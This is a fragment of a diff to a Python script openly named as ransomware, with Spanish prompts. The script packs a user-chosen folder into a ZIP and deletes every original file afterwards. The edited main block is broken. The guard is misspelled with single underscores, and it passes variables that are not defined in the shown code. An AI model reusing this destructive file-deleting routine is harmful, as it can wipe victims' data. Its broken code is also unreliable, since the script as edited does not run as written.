@@ -1,4 +1,4 @@
-# ransomware_encrypt_zip.py
+# ransomware_encrypt.py
 import os
 import zipfile
 
@@ -28,10 +28,8 @@ def encrypt_files_to_zip(folder, zip_filename, password):
                 # Borra el archivo original después de cifrar
                 os.remove(file_path)
 
-if __name__ == "__main__":
-    folder_to_encrypt = input("Ingresa la dirección de la carpeta que quieres encriptar: ")
-    zip_filename = input("Ingresa el nombre del archivo ZIP a crear (ejemplo: archivos_cifrados.zip): ")
-    encrypt_files_to_zip(folder_to_encrypt, zip_filename)
+if _name_ == "_main_":
+    folder_to_encrypt = input("Ingresa la dirección de la carpeta que quieres cifrar: ")
 
     # Crea el archivo ZIP con un marcador de contraseña
     encrypt_files_to_zip(folder_to_encrypt, ZIP_FILENAME, user_password)
